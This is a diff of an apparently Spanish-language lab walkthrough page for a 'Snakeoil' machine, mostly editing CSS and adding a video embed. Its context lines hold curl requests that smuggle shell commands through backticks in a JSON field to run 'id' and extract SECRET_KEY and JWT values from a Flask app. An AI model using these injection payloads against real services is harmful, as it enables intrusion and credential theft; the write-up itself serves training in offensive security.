@@ -8,28 +8,23 @@
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
     
     <style>
-        /* --- ESTILOS PARA LOS BLOQUES DE CÓDIGO (ESTILO TERMINAL) --- */
         pre {
-            background-color: #1a1b26; /* Fondo oscuro (estilo Tokyo Night) */
-            color: #a9b1d6; /* Color de texto base claro */
+            background-color: #1a1b26; 
+            color: #a9b1d6;
             padding: 16px 20px;
             border-radius: 8px;
-            overflow-x: auto; /* Scroll horizontal si el texto es muy largo */
+            overflow-x: auto; 
             font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
             font-size: 0.95rem;
             line-height: 1.6;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); /* Sombra elegante */
-            border-left: 4px solid #00ffcc; /* Detalle de color cyan (Ciberseguridad) */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); 
+            border-left: 4px solid #00ffcc; 
             margin: 20px 0;
         }
-
-        /* Color para los comandos para que resalten más */
         pre code {
-            color: #00ffcc; /* Color cyan brillante para el texto del código */
-            text-shadow: 0px 0px 3px rgba(0, 255, 204, 0.2); /* Efecto ligero de brillo */
+            color: #00ffcc; 
+            text-shadow: 0px 0px 3px rgba(0, 255, 204, 0.2);
         }
-
-        /* Personalización de la barra de desplazamiento (Scrollbar) para los bloques de código */
         pre::-webkit-scrollbar {
             height: 8px;
         }
@@ -45,7 +40,6 @@
         pre::-webkit-scrollbar-thumb:hover {
             background: #00ffcc;
         }
-        /* ----------------------------------------------------------- */
     </style>
 </head>
 <body>
@@ -130,7 +124,7 @@
 -d '{"url":"127.0.0.1:80`id`","secret_key":"commandexecutionissecret"}'</code></pre>
 
                 <p><strong>Extracción de contraseñas de app.py:</strong></p>
-<pre><code>curl -X POST http://192.168.56.103:8080/run \
+                <pre><code>curl -X POST http://192.168.56.103:8080/run \
 -H "Content-Type: application/json" \
 -d '{"url":"127.0.0.1:80`grep -E "SECRET_KEY|JWT" \
 /home/patrick/flask_blog/app.py`","secret_key":"commandexecutionissecret"}'</code></pre>
@@ -184,6 +178,24 @@ cat /root/proof.txt</code></pre>
                     de sudo. El ejercicio reforzó la relación entre los conceptos teóricos de seguridad 
                     ofensiva y su aplicación práctica en un entorno controlado.
                 </p>
+            </section>
+
+            <!-- ========== SECCIÓN DEL VIDEO ========== -->
+            <section class="evidence-card">
+                <div class="card-number">VIDEO</div>
+                <h3>Video Walkthrough</h3>
+                <p>A continuación se presenta el video completo del walkthrough:</p>
+                
+                <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; border-radius: 8px; margin-top: 15px;">
+                    <iframe 
+                        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" 
+                        src="https://youtu.be/AXMaSePmR-U" 
+                        title="Walkthrough Snakeoil"
+                        frameborder="0" 
+                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                        allowfullscreen>
+                    </iframe>
+                </div>
             </section>
 
         </main>
